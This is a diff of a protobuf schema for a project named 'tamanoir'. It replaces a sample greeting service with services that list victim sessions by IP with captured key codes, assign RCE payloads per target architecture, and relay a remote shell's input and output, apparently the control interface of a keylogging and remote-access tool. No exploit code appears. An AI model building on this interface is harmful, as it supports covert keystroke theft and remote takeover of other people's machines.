@@ -2,39 +2,54 @@ syntax = "proto3";
 
 package tamanoir;
 
-service Greeter {
-  rpc SayHello (HelloRequest) returns (HelloReply) {}
-}
 
-message HelloRequest {
-  string name = 1;
-}
+message Empty {}
 
-message HelloReply {
-  string message = 1;
-}
 
-message NoArgs {}
-message StatusResponse {
-  bool success=1;
-  string err=2;
-}
-
-message GetSessionsResponse {
+message ListSessionsResponse {
   repeated SessionResponse sessions = 1;
 }
 
+message SessionRcePayload {
+  string name=1;
+  string target_arch=2;
+  uint32 length=3;
+  uint32 buffer_length =4;
+}
 message SessionResponse {
   string ip =1;
   repeated uint32 key_codes=2; 
+  SessionRcePayload rce_payload=3;
 }
 message SetSessionRceRequest {
   string ip=1;
   string rce=2;
-  string target_arch=3;
+  string target_arch=3; 
+}
+message DeleteSessionRceRequest {
+  string ip=1;
 }
 
-service Proxy {
-  rpc GetSessions (NoArgs) returns (GetSessionsResponse) {}
-  rpc SetSessionRce (SetSessionRceRequest) returns (NoArgs) {}
+message AvailableRceResponse {
+  repeated SessionRcePayload rce_list =1;
+}
+message ShellStd {
+  string message=1;
+}
+
+service Session {
+  rpc ListSessions (Empty) returns ( ListSessionsResponse) {}
+  rpc WatchSessions (Empty) returns ( stream SessionResponse) {}
+
+}
+service Rce {
+  rpc SetSessionRce (SetSessionRceRequest) returns (Empty) {}
+  rpc DeleteSessionRce (DeleteSessionRceRequest) returns (Empty) {}
+  rpc ListAvailableRce (Empty) returns (AvailableRceResponse) {}
+}
+service RemoteShell {
+  rpc WatchShellStdOut (Empty) returns ( stream ShellStd) {}
+  rpc SendShellStdIn (ShellStd) returns (Empty) {}
+
+
 }
